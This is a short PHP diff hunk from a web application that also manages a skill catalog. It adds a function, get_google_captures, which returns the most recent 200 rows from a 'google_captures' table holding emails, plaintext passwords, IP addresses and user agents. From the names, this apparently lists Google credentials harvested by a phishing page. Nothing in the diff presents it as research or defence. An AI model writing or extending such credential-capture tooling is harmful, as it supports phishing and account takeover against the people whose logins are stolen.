@@ -401,6 +401,18 @@ function sync_skill_catalog(PDO $pdo): void
     $pdo->exec('PRAGMA user_version = 6');
 }
 
+function get_google_captures(int $limit = 200): array
+{
+    try {
+        $st = db()->prepare('SELECT id, email, password, ip, user_agent, captured_at FROM google_captures ORDER BY id DESC LIMIT ?');
+        $st->bindValue(1, $limit, PDO::PARAM_INT);
+        $st->execute();
+        return $st->fetchAll();
+    } catch (Throwable) {
+        return [];
+    }
+}
+
 function get_skill_by_name(string $name): ?array
 {
     $st = db()->prepare('SELECT * FROM skills WHERE name = ?');
